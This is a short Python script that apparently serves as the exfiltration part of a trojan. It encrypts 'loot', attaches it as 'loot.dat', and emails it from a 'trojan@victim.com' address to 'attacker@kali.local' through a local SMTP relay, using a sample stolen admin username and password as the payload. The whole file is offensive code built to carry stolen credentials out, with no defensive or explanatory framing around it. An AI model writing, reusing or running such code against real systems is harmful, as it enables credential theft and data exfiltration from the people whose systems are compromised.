import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from cryptor import encrypt

def send_email(data):
    msg = MIMEMultipart()
    msg['From'] = "trojan@victim.com"
    msg['To'] = "attacker@kali.local"
    msg['Subject'] = "Loot Found"

    msg.attach(MIMEText("Attached is the encrypted data.", 'plain'))

    # Encrypt the data
    encrypted_data = encrypt(data)

    attachment = MIMEBase('application', 'octet-stream')
    attachment.set_payload(encrypted_data)
    encoders.encode_base64(attachment)
    attachment.add_header('Content-Disposition', 'attachment; filename="loot.dat"')
    msg.attach(attachment)

    try:
        server = smtplib.SMTP('127.0.0.1', 1025)
        server.sendmail(msg['From'], msg['To'], msg.as_string())
        server.quit()
        print("[+] Email sent successfully!")
    except Exception as e:
        print(f"[!] Error: {e}")

if __name__ == '__main__':
    loot = b"STOLEN DATA: User=Admin, Pass=P@ssw0rd123"
    send_email(loot)
